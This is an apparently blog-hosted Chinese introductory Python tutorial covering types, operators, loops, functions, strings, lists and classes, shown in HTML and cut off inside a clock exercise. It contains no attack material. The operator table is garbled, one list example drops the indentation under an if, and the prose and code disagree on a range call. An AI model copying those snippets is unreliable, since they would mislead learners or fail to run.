        <content type="html"><![CDATA[<h1>python</h1><h2 id="变量和类型">变量和类型</h2><h3 id="常见的数据类型：">常见的数据类型：</h3><p>整型：int类型支持二进制八进制十六进制的转换</p><p>浮点型：</p><p>字符串类型：以单引号和双信号引起来的任意文本，字符串还有原始字符串表示法，unicode表示法等。</p><p>布尔型;只有True False两种值(注意大小写)</p><p>复数型：这个不常用</p><h3 id="变量命名">变量命名</h3><ul><li>硬性规则：<ul><li>变量名由字母（广义的Unicode字符，不包括特殊字符）、数字和下划线构成，数字不能开头。</li><li>大小写敏感（大写的<code>a</code>和小写的<code>A</code>是两个不同的变量）。</li><li>不要跟关键字（有特殊含义的单词，后面会讲到）和系统保留字（如函数、模块等的名字）冲突。</li></ul></li><li>PEP 8要求：<ul><li>用小写字母拼写，多个单词用下划线连接。</li><li>受保护的实例属性用单个下划线开头（后面会讲到）。</li><li>私有的实例属性用两个下划线开头（后面会讲到）。</li></ul></li></ul><p>数据类型的转换：</p><ul><li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li><li><code>float()</code>：将一个字符串转换成浮点数。</li><li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li><li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li><li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。</li></ul><p>运算符：</p><table><thead><tr><th>运算符</th><th>描述</th></tr></thead><tbody><tr><td><code>[]</code> <code>[:]</code></td><td>下标，切片</td></tr><tr><td><code>**</code></td><td>指数</td></tr><tr><td><code>~</code> <code>+</code> <code>-</code></td><td>按位取反, 正负号</td></tr><tr><td><code>*</code> <code>/</code> <code>%</code> <code>//</code></td><td>乘，除，模，整除</td></tr><tr><td><code>+</code> <code>-</code></td><td>加，减</td></tr><tr><td><code>&gt;&gt;</code> <code>&lt;&lt;</code></td><td>右移，左移</td></tr><tr><td><code>&amp;</code></td><td>按位与</td></tr><tr><td><code>^</code> <code>|</code></td><td>按位异或，按位或</td></tr><tr><td><code>&lt;=</code> <code>&lt;</code> <code>&gt;</code> <code>&gt;=</code></td><td>小于等于，小于，大于，大于等于</td></tr><tr><td><code>==</code> <code>!=</code></td><td>等于，不等于</td></tr><tr><td><code>is</code>  <code>is not</code></td><td>身份运算符</td></tr><tr><td><code>in</code> <code>not in</code></td><td>成员运算符</td></tr><tr><td><code>not</code> <code>or</code> <code>and</code></td><td>逻辑运算符</td></tr><tr><td><code>=</code> <code>+=</code> <code>-=</code> <code>*=</code> <code>/=</code> <code>%=</code> <code>//=</code> <code>**=</code> <code>&amp;=</code> `</td><td>=<code> </code>^=<code> </code>&gt;&gt;=<code> </code>&lt;&lt;=`</td></tr></tbody></table><h2 id="python的分支结构">python的分支结构</h2><p>python中代码的结构层次采用缩进的方式来表示，if如果要执行多条语句，只需要保持多条语句有相同的缩进即可，通常使用四个空格。</p><h3 id="if">if</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = <span class="built_in">float</span>(<span class="built_in">input</span>(<span class="string">&#x27;x = &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> x &gt; <span class="number">1</span>:</span><br><span class="line">    y = <span class="number">3</span> * x - <span class="number">5</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> x &gt;= -<span class="number">1</span>:</span><br><span class="line">        y = x + <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        y = <span class="number">5</span> * x + <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;f(%.2f) = %.2f&#x27;</span> % (x, y))</span><br></pre></td></tr></table></figure><h3 id="for-in循环">for-in循环</h3><p>如果明确知道循环的执行次数，或者要对一个容器进行迭代建议使用for-in循环。例如：计算1~100求和的结果</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sum</span> = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">101</span>):</span><br><span class="line">    <span class="built_in">sum</span> += x</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>)</span><br></pre></td></tr></table></figure><p>需要说明的是上面代码中的<code>range(1, 101)</code>可以用来构造一个从1到100的范围，当我们把这样一个范围放到<code>for-in</code>循环中，就可以通过前面的循环变量<code>x</code>依次取出从1到100的整数。当然，<code>range</code>的用法非常灵活，下面给出了一个例子：</p><ul><li><code>range(101)</code>：可以用来产生0到100范围的整数，需要注意的是取不到101。</li><li><code>range(1, 101)</code>：可以用来产生1到100范围的整数，相当于前面是闭区间后面是开区间。</li><li><code>range(1, 101, 2)</code>：可以用来产生1到100的奇数，其中2是步长，即每次数值递增的值。</li><li><code>range(100, 0, -2)</code>：可以用来产生100到1的偶数，其中-2是步长，即每次数字递减的值。</li></ul><h3 id=""></h3><h3 id="whlie循环">whlie循环</h3><p>如果要构造不知道具体循环次数的循环结构，我们推荐使用<code>while</code>循环。<code>while</code>循环通过一个能够产生或转换出<code>bool</code>值的表达式来控制循环，表达式的值为<code>True</code>则继续循环；表达式的值为<code>False</code>则结束循环。</p><p>例如下面的猜数字小游戏</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">answer = random.randint(<span class="number">1</span>, <span class="number">100</span>)</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    counter += <span class="number">1</span></span><br><span class="line">    number = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;请输入: &#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> number &lt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;大一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">elif</span> number &gt; answer:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;小一点&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;恭喜你猜对了!&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;你总共猜了%d次&#x27;</span> % counter)</span><br><span class="line"><span class="keyword">if</span> counter &gt; <span class="number">7</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;你的智商余额明显不足&#x27;</span>)</span><br></pre></td></tr></table></figure><h1>python函数的应用</h1><p>定义函数：在Python中可以使用<code>def</code>关键字来定义函数，和变量一样每个函数也有一个响亮的名字，而且命名规则跟变量的命名规则是一致的。在函数名后面的圆括号中可以放置传递给函数的参数，这一点和数学上的函数非常相似，程序中函数的参数就相当于是数学上说的函数的自变量，而函数执行完成后我们可以通过<code>return</code>关键字来返回一个值，这相当于数学上说的函数的因变量。</p><p>阶乘函数:自定义，其中在math库中factorial为阶乘函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">fac</span>(<span class="params">num</span>):</span><br><span class="line">    result = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, num + <span class="number">1</span>):</span><br><span class="line">        result *= n</span><br><span class="line">    <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure><p>Python中，函数的参数可以有默认值，也支持使用可变参数，所以Python并不需要像其他语言一样支持<a href="https://zh.wikipedia.org/wiki/%E5%87%BD%E6%95%B0%E9%87%8D%E8%BD%BD">函数的重载</a>，因为我们在定义一个函数的时候可以让它有多种不同的使用方式。</p><p>引用函数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> module1 <span class="keyword">as</span> m1</span><br><span class="line"><span class="keyword">import</span> module2 <span class="keyword">as</span> m2</span><br><span class="line"></span><br><span class="line">m1.foo()</span><br><span class="line">m2.foo()</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> module1 <span class="keyword">import</span> foo</span><br><span class="line"><span class="keyword">from</span> module2 <span class="keyword">import</span> foo</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出goodbye, world!</span></span><br><span class="line">foo()</span><br></pre></td></tr></table></figure><p>如果写成上面这个样子，那么输出的即为最后一个foo,会将前面的覆盖。</p><h2 id="字符串和常用数据结构">字符串和常用数据结构</h2><p>所谓<strong>字符串</strong>，就是由零个或多个字符组成的有限序列，，如果我们把单个或多个字符用单引号或者双引号包围起来，就可以表示一个字符串。</p><p>可以在字符串中使用<code>\</code>（反斜杠）来表示转义，也就是说<code>\</code>后面的字符不再是它原来的意义，例如：<code>\n</code>不是代表反斜杠和字符n，而是表示换行；而<code>\t</code>也不是代表反斜杠和字符t，而是表示制表符。所以如果想在字符串中表示<code>'</code>要写成<code>\'</code>，同理想表示<code>\</code>要写成<code>\\</code>。可以运行下面的代码看看会输出什么。</p><p>如果不希望字符串中的<code>\</code>表示转义，我们可以通过在字符串的最前面加上字母<code>r</code>来加以说明。</p><p>Python为字符串类型提供了非常丰富的运算符，我们可以使用<code>+</code>运算符来实现字符串的拼接，可以使用<code>*</code>运算符来重复一个字符串的内容，可以使用<code>in</code>和<code>not in</code>来判断一个字符串是否包含另外一个字符串（成员运算），我们也可以用<code>[]</code>和<code>[:]</code>运算符从字符串取出某个字符或某些字符（切片运算）。例如下面：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello &#x27;</span> * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># hello hello hello </span></span><br><span class="line">s2 = <span class="string">&#x27;world&#x27;</span></span><br><span class="line">s1 += s2</span><br><span class="line"><span class="built_in">print</span>(s1) <span class="comment"># hello hello hello world</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;ll&#x27;</span> <span class="keyword">in</span> s1) <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;good&#x27;</span> <span class="keyword">in</span> s1) <span class="comment"># False</span></span><br><span class="line">str2 = <span class="string">&#x27;abc123456&#x27;</span></span><br><span class="line"><span class="comment"># 从字符串中取出指定位置的字符(下标运算)</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>]) <span class="comment"># c</span></span><br><span class="line"><span class="comment"># 字符串切片(从指定的开始索引到指定的结束索引)</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>:<span class="number">5</span>]) <span class="comment"># c12</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>:]) <span class="comment"># c123456</span></span><br><span class="line"><span class="built_in">print</span>(str2[<span class="number">2</span>::<span class="number">2</span>]) <span class="comment"># c246</span></span><br><span class="line"><span class="built_in">print</span>(str2[::<span class="number">2</span>]) <span class="comment"># ac246</span></span><br><span class="line"><span class="built_in">print</span>(str2[::-<span class="number">1</span>]) <span class="comment"># 654321cba</span></span><br><span class="line"><span class="built_in">print</span>(str2[-<span class="number">3</span>:-<span class="number">1</span>]) <span class="comment"># 45</span></span><br></pre></td></tr></table></figure><p>对字符串的处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">str1 = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line"><span class="comment"># 通过内置函数len计算字符串的长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(str1)) <span class="comment"># 13</span></span><br><span class="line"><span class="comment"># 获得字符串首字母大写的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.capitalize()) <span class="comment"># Hello, world!</span></span><br><span class="line"><span class="comment"># 获得字符串每个单词首字母大写的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.title()) <span class="comment"># Hello, World!</span></span><br><span class="line"><span class="comment"># 获得字符串变大写后的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str1.upper()) <span class="comment"># HELLO, WORLD!</span></span><br><span class="line"><span class="comment"># 从字符串中查找子串所在位置</span></span><br><span class="line"><span class="built_in">print</span>(str1.find(<span class="string">&#x27;or&#x27;</span>)) <span class="comment"># 8</span></span><br><span class="line"><span class="built_in">print</span>(str1.find(<span class="string">&#x27;shit&#x27;</span>)) <span class="comment"># -1</span></span><br><span class="line"><span class="comment"># 与find类似但找不到子串时会引发异常</span></span><br><span class="line"><span class="comment"># print(str1.index(&#x27;or&#x27;))</span></span><br><span class="line"><span class="comment"># print(str1.index(&#x27;shit&#x27;))</span></span><br><span class="line"><span class="comment"># 检查字符串是否以指定的字符串开头</span></span><br><span class="line"><span class="built_in">print</span>(str1.startswith(<span class="string">&#x27;He&#x27;</span>)) <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(str1.startswith(<span class="string">&#x27;hel&#x27;</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 检查字符串是否以指定的字符串结尾</span></span><br><span class="line"><span class="built_in">print</span>(str1.endswith(<span class="string">&#x27;!&#x27;</span>)) <span class="comment"># True</span></span><br><span class="line"><span class="comment"># 将字符串以指定的宽度居中并在两侧填充指定的字符</span></span><br><span class="line"><span class="built_in">print</span>(str1.center(<span class="number">50</span>, <span class="string">&#x27;*&#x27;</span>))</span><br><span class="line"><span class="comment"># 将字符串以指定的宽度靠右放置左侧填充指定的字符</span></span><br><span class="line"><span class="built_in">print</span>(str1.rjust(<span class="number">50</span>, <span class="string">&#x27; &#x27;</span>))</span><br><span class="line">str2 = <span class="string">&#x27;abc123456&#x27;</span></span><br><span class="line"><span class="comment"># 检查字符串是否由数字构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isdigit())  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 检查字符串是否以字母构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isalpha())  <span class="comment"># False</span></span><br><span class="line"><span class="comment"># 检查字符串是否以数字和字母构成</span></span><br><span class="line"><span class="built_in">print</span>(str2.isalnum())  <span class="comment"># True</span></span><br><span class="line">str3 = <span class="string">&#x27;  jackfrued@126.com &#x27;</span></span><br><span class="line"><span class="built_in">print</span>(str3)</span><br><span class="line"><span class="comment"># 获得字符串修剪左右两侧空格之后的拷贝</span></span><br><span class="line"><span class="built_in">print</span>(str3.strip())</span><br></pre></td></tr></table></figure><p>a*b=多少的简洁写法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a, b = <span class="number">5</span>, <span class="number">10</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;a&#125;</span> * <span class="subst">&#123;b&#125;</span> = <span class="subst">&#123;a * b&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>接下来我们要介绍的列表（<code>list</code>），也是一种结构化的、非标量类型，它是值的有序序列，每个值都可以通过索引进行标识，定义列表可以将列表的元素放在<code>[]</code>中，多个元素用<code>,</code>进行分隔，可以使用<code>for</code>循环对列表元素进行遍历，也可以使用<code>[]</code>或<code>[:]</code>运算符取出列表中的一个或多个元素。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 3, 5, 7, 100]</span></span><br><span class="line"><span class="comment"># 乘号表示列表元素的重复</span></span><br><span class="line">list2 = [<span class="string">&#x27;hello&#x27;</span>] * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(list2) <span class="comment"># [&#x27;hello&#x27;, &#x27;hello&#x27;, &#x27;hello&#x27;]</span></span><br><span class="line"><span class="comment"># 计算列表长度(元素个数)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1)) <span class="comment"># 5</span></span><br><span class="line"><span class="comment"># 下标(索引)运算</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">0</span>]) <span class="comment"># 1</span></span><br><span class="line"><span class="built_in">print</span>(list1[<span class="number">4</span>]) <span class="comment"># 100</span></span><br><span class="line"><span class="comment"># print(list1[5])  # IndexError: list index out of range</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">1</span>]) <span class="comment"># 100</span></span><br><span class="line"><span class="built_in">print</span>(list1[-<span class="number">3</span>]) <span class="comment"># 5</span></span><br><span class="line">list1[<span class="number">2</span>] = <span class="number">300</span></span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 3, 300, 7, 100]</span></span><br><span class="line"><span class="comment"># 通过循环用下标遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> index <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(list1)):</span><br><span class="line">    <span class="built_in">print</span>(list1[index])</span><br><span class="line"><span class="comment"># 通过for循环遍历列表元素</span></span><br><span class="line"><span class="keyword">for</span> elem <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="built_in">print</span>(elem)</span><br><span class="line"><span class="comment"># 通过enumerate函数处理列表之后再遍历可以同时获得元素索引和值</span></span><br><span class="line"><span class="keyword">for</span> index, elem <span class="keyword">in</span> <span class="built_in">enumerate</span>(list1):</span><br><span class="line">    <span class="built_in">print</span>(index, elem)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">list1 = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">100</span>]</span><br><span class="line"><span class="comment"># 添加元素</span></span><br><span class="line">list1.append(<span class="number">200</span>)</span><br><span class="line">list1.insert(<span class="number">1</span>, <span class="number">400</span>)</span><br><span class="line"><span class="comment"># 合并两个列表</span></span><br><span class="line"><span class="comment"># list1.extend([1000, 2000])</span></span><br><span class="line">list1 += [<span class="number">1000</span>, <span class="number">2000</span>]</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 400, 3, 5, 7, 100, 200, 1000, 2000]</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(list1)) <span class="comment"># 9</span></span><br><span class="line"><span class="comment"># 先通过成员运算判断元素是否在列表中，如果存在就删除该元素</span></span><br><span class="line"><span class="keyword">if</span> <span class="number">3</span> <span class="keyword">in</span> list1:</span><br><span class="line">list1.remove(<span class="number">3</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="number">1234</span> <span class="keyword">in</span> list1:</span><br><span class="line">    list1.remove(<span class="number">1234</span>)</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [1, 400, 5, 7, 100, 200, 1000, 2000]</span></span><br><span class="line"><span class="comment"># 从指定的位置删除元素</span></span><br><span class="line">list1.pop(<span class="number">0</span>)</span><br><span class="line">list1.pop(<span class="built_in">len</span>(list1) - <span class="number">1</span>)</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># [400, 5, 7, 100, 200, 1000]</span></span><br><span class="line"><span class="comment"># 清空列表元素</span></span><br><span class="line">list1.clear()</span><br><span class="line"><span class="built_in">print</span>(list1) <span class="comment"># []</span></span><br></pre></td></tr></table></figure><h2 id="面向对象编程">面向对象编程</h2><h3 id="定义类">定义类</h3><p>class定义类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line"></span><br><span class="line">    <span class="comment"># __init__是一个特殊方法用于在创建对象时进行初始化操作</span></span><br><span class="line">    <span class="comment"># 通过这个方法我们可以为学生对象绑定name和age两个属性</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        self.name = name</span><br><span class="line">        self.age = age</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">study</span>(<span class="params">self, course_name</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;%s正在学习%s.&#x27;</span> % (self.name, course_name))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># PEP 8要求标识符的名字用全小写多个单词用下划线连接</span></span><br><span class="line">    <span class="comment"># 但是部分程序员和公司更倾向于使用驼峰命名法(驼峰标识)</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">watch_movie</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.age &lt; <span class="number">18</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;%s只能观看《熊出没》.&#x27;</span> % self.name)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;%s正在观看岛国爱情大电影.&#x27;</span> % self.name)</span><br></pre></td></tr></table></figure><h3 id="创建和使用对象">创建和使用对象</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="comment"># 创建学生对象并指定姓名和年龄</span></span><br><span class="line">    stu1 = Student(<span class="string">&#x27;骆昊&#x27;</span>, <span class="number">38</span>)</span><br><span class="line">    <span class="comment"># 给对象发study消息</span></span><br><span class="line">    stu1.study(<span class="string">&#x27;Python程序设计&#x27;</span>)</span><br><span class="line">    <span class="comment"># 给对象发watch_av消息</span></span><br><span class="line">    stu1.watch_movie()</span><br><span class="line">    stu2 = Student(<span class="string">&#x27;王大锤&#x27;</span>, <span class="number">15</span>)</span><br><span class="line">    stu2.study(<span class="string">&#x27;思想品德&#x27;</span>)</span><br><span class="line">    stu2.watch_movie()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>练习：</p><p>1.定义一个类似描述数字的时钟</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Clock</span>(<span class="title class_ inherited__">object</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;数字时钟&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, hour=<span class="number">0</span>, minute=<span class="number">0</span>, second=<span class="number">0</span></span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;初始化方法</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        :param hour: 时</span></span><br><span class="line"><span class="string">        :param minute: 分</span></span><br><span class="line"><span class="string">        :param second: 秒</span></span><br><span class="line"><span class="string">        &quot;&quot;&quot;</span></span><br><span class="line">        self._hour = hour</span><br><span class="line">        self._minute = minute</span><br><span class="line">        self._second = second</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;走字&quot;&quot;&quot;</span></span><br><span class="line">        self._second += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> self._second == <span class="number">60</span>:</span><br><span class="line">            self._second = <span class="number">0</span></span><br><span class="line">            self._minute += <span class="number">1</span></span><br><span class="line">            <span class="keyword">if</span> self._minute == <span class="number">60</span>:</span><br><span class="line">                self._minute = <span class="number">0</span></span><br><span class="line">                self._hour += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> self._hour == <span class="number">24</span>:</span><br><span class="line">                    self._hour = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&quot;&quot;&quot;显示时间&quot;&quot;&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;%02d:%02d:%02d&#x27;</span> % \</span><br><span class="line">               (self._hour, self._minute, self._second)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    clock = Clock(<span class="number">23</span>, <span class="number">59</span>, <span class="number">58</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="built_in">print</span>(clock.show())</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">        clock.run()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    